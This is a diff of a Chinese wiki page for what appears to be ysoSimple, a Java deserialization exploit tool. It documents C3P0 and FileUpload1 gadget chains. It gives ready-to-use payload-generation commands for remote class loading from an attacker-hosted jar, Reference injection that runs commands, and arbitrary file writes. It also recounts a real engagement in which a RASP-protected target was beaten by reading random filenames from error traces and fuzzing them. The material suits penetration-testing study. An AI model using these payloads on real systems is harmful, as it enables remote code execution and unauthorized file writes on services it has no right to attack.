@@ -588,54 +588,6 @@ CommonsCollections利用链能被Java反序列化利用的原因是其中的Tran
 
 这里的raw_cmd参数可以替换为CC链的多种漏洞利用效果参数。
 
-#### C3P0系列
-
-C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打法可以先学习：[https://www.cnblogs.com/BUTLER/p/17473487.html](https://www.cnblogs.com/BUTLER/p/17473487.html)
-
-* Jndi 注入：C3P01 生成序列化流比较复杂目前未集成
-* URLCLassLoader 远程类加载：C3P02，C3P02_c3p0
-* 不出网的Reference注入：C3P03，C3P03_c3p0
-
-另外网上存在两种C3P0依赖，com.mchange:c3p0、c3p0:c3p0。两个C3P0都能够利用但是俩者的SUID不同。
-
-|ysoSimple利用链|需要的依赖|PoolBackedDataSource suid|JndiRefConnectionPoolDataSource|
-| -----------------| ------------------| ---------------------------| ---------------------------------|
-|C3P02|com.mchange:c3p0|-2440162180985815128L<br />|6594570032105297376L|
-|C3P02_c3p0|c3p0:c3p0|7387108436934414104L<br />|5807565096136484351L|
-
-##### C3P02 远程类加载
-
-描述：打一次后因为类已经被加载到内存中，所以如果要切换漏洞利用效果需要重新设定类名和Jar包名
-
-工具：使用方式如下：
-
-```bash
-# com.mchange:c3p0
--m YsoAttack -g C3P02 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
-
-# c3p0:c3p0
--m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
--m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/EncryptionUtil.jar|ch.qos.logback.qd.EncryptionUtil"
-```
-
-##### C3P03 不出网Reference注入
-
-描述：C3P0利用链可以不出网利用，关于利用链的构造可以学习yulegeyu师傅的[JAVA反序列化之C3P0不出网利用](https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)文章。所以做漏洞利用的时候可引用JNDIAttack模块的Reference本地工厂类。而因为JNDIAttack模块有些Refernce工厂类漏洞利用又是出网的(如:Snakeyaml)，所以实际攻防时还需要注意构造合适的args参数
-
-工具：使用方式如下：参数直接写Reference打法的路由。注意Refernce的最后路径利用参数需要Base64编码，否则生成Payload会有问题。
-
-```python
-# com.mchange:c3p0
--m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/calc"
--m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
--m YsoAttack -g C3P03 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
-
-# c3p0:c3p0
--m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/calc"
--m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
--m YsoAttack -g C3P03_c3p0 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
-```
-
 ####  SpringAOP(JDK高版本)
 
 描述：这条链其实也可以叫做Jackson利用链，利用链的触发流程和Jackson基本一样。但是区分开来主要是该链针对JDK高版本反序列化而设计的：通过SpringAOP包的动态代理类绕过模块化的限制，使用XString头触发POJONode的toString方法，TemplatesImpl加载的类不继承AbstractTranslet接口。
@@ -723,6 +675,117 @@ jackson-2.14.2 com.fasterxml.jackson.databind.node.POJONode BaseJsonNode 继承S
    - BadAttributeValueExpException在jdk高版本无法触发toSting
    - EventListenerList在不同jdk版本的编译下suid不同，所以jdk8生成的suid不能在jdk17使用
    - UIDefaults$TextAndMnemonicHashMap在不同jdk版本的编译下suid不同(未测试)，所以jdk8生成的suid不能在jdk17使用
+
+### C3P0系列
+
+C3P0依赖下的Java反序列化有3种类型的攻击链：关于C3P0的些打法可以先学习：[https://www.cnblogs.com/BUTLER/p/17473487.html](https://www.cnblogs.com/BUTLER/p/17473487.html)
+
+* Jndi 注入：C3P01 生成序列化流比较复杂目前未集成
+* URLCLassLoader 远程类加载：C3P02，C3P02_c3p0
+* 不出网的Reference注入：C3P03，C3P03_c3p0
+
+另外网上存在两种C3P0依赖，com.mchange:c3p0、c3p0:c3p0。两个C3P0都能够利用但是俩者的SUID不同。
+
+| ysoSimple利用链 | 需要的依赖       | PoolBackedDataSource suid   | JndiRefConnectionPoolDataSource |
+| --------------- | ---------------- | --------------------------- | ------------------------------- |
+| C3P02           | com.mchange:c3p0 | -2440162180985815128L<br /> | 6594570032105297376L            |
+| C3P02_c3p0      | c3p0:c3p0        | 7387108436934414104L<br />  | 5807565096136484351L            |
+
+#### C3P02 远程类加载
+
+描述：打一次后因为类已经被加载到内存中，所以如果要切换漏洞利用效果需要重新设定类名和Jar包名
+
+工具：使用方式如下：
+
+```bash
+# com.mchange:c3p0
+-m YsoAttack -g C3P02 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
+
+# c3p0:c3p0
+-m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/T32150077959500.jar|T32150077959500"
+-m YsoAttack -g C3P02_c3p0 -a "http://127.0.0.1:2333/EncryptionUtil.jar|ch.qos.logback.qd.EncryptionUtil"
+```
+
+#### C3P03 不出网Reference注入
+
+描述：C3P0利用链可以不出网利用，关于利用链的构造可以学习yulegeyu师傅的[JAVA反序列化之C3P0不出网利用](https://www.yulegeyu.com/2021/10/10/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)文章。所以做漏洞利用的时候可引用JNDIAttack模块的Reference本地工厂类。而因为JNDIAttack模块有些Refernce工厂类漏洞利用又是出网的(如:Snakeyaml)，所以实际攻防时还需要注意构造合适的args参数
+
+工具：使用方式如下：参数直接写Reference打法的路由。注意Refernce的最后路径利用参数需要Base64编码，否则生成Payload会有问题。
+
+```python
+# com.mchange:c3p0
+-m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/calc"
+-m YsoAttack -g C3P03 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
+-m YsoAttack -g C3P03 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
+
+# c3p0:c3p0
+-m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/calc"
+-m YsoAttack -g C3P03_c3p0 -a "/TomcatBypass/auto_cmd/Y2FsYw=="
+-m YsoAttack -g C3P03_c3p0 -a "/TomcatJDBC/H2CreateAlias/auto_cmd/Y2FsYw=="
+```
+
+ReferenceableUtils#referenceToObject 在不同的C3P0版本对ObjectFactory使用的类加载器不同
+
+使用URLClassLoader而不是线程上下文的情况
+
+```
+文件内容是jar包情况
+lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\"; //文件名后缀是jar不可以加载字节码类成功，文件名后缀是tmp不可以加载字节码类成功
+lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T32448485776400.jar"; //可以加载字节码类成功
+lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T32448485776400.tmp"; //可以加载字节码类成功
+
+文件内容是class文件情况
+lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\"; //文件名后缀是class可以加载字节码类成功，文件名后缀是tmp不可以加载字节码类成功
+lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T31147297087600.class"; //可以加载字节码类成功
+lcation = "file:///C:\\\\Users\\butler\\Desktop\\ysoSimple\\Temp\\FileUpload1\\T31147297087600.tmp"; //不可以加载字节码类成功
+```
+
+### FileUpload1
+
+描述：Java反序列化中直接写文件的利用链，主要的功能如下：
+
+* 将任意文件复制到任意目录(如果可能，源文件会被删除)，实战中不推荐使用。
+* commons-fileupload 1.3.1之前版本(+ 旧JRE)：将数据写入指定目录中指定文件名的文件
+* commons-fileupload 1.3.1+版本：将数据写入指定目录中文件名随机的文件
+
+该漏洞利用链需要的依赖和版本：
+
+- commons-fileupload : 1.3.x
+- commons-io : 2.x 
+
+工具：yso利用参数
+
+- copyAndDelete;sourceFile;destDir
+- write;destDir;ascii-data
+- writeB64;destDir;base64-data  写文件使用该配置
+- writeOld;destFile;ascii-data   
+- writeOldB64;destFile;base64-data  适用于commons-fileupload 1.3.1之前版本(+ 旧JRE)，不在版本范围内使用该漏洞利用链可报错出随机的文件名。
+
+```bash
+-m YsoAttack -g FileUpload1 -a "writeOldB64;/home/web/success.txt;c3VjY2Vzcw==" -encode="Hex"
+
+-m YsoAttack -g FileUpload1 -a "writeOldB64;/home/web/success.txt;c3VjY2Vzcw==" -encode="Hex"
+```
+
+实战应用：有次遇到个反序列化但是被上RASP了。目标很多反序列化利用链都用不了，经过反复测试发现存在FileUpload1可以利用，目标还有个特点是如果反序列化产生报错会产生报错信息和调用栈
+
+1. 目标也不是jdk低版本所以用 FileUpload1 的 writeOldB64;destFile;base64-data 序列化数据打过去造成报错，得出随机文件名。后续我们正确利用链打过去生成的文件名就是在报错调用栈得出的文件名，最后一位阿拉伯数的变化。upload_d43417ce_5c03_4489_b9a0_ca77d7af2f09_00000000
+
+```bash
+-g FileUpload1 -a "writeB64;/home/web/success.txt;c3VjY2Vzcw==" -encode="Hex"
+```
+
+![image-20251105094502063](ysoSimple-Wiki.assets/image-20251105094502063.png)
+
+2. 使用正确的写文件利用链打过去
+
+```bash
+-m YsoAttack -g FileUpload1 -a "writeB64;/home/web/success.txt;c3VjY2Vzcw==" -encode="Hex"
+```
+
+![image-20251105094803376](ysoSimple-Wiki.assets/image-20251105094803376.png)
+
+观察这个生成upload_d43417ce_5c03_4489_b9a0_ca77d7af2f09_00000003.tmp文件，就是上面那个报错产生的文件最后一位变化了，所以实战中我们要访问到这个随机文件，fuzz最后一位就行:![image-20251105094826681](ysoSimple-Wiki.assets/image-20251105094826681.png)
 
 ## 2.Hessian反序列化(​HessianAttack)
 
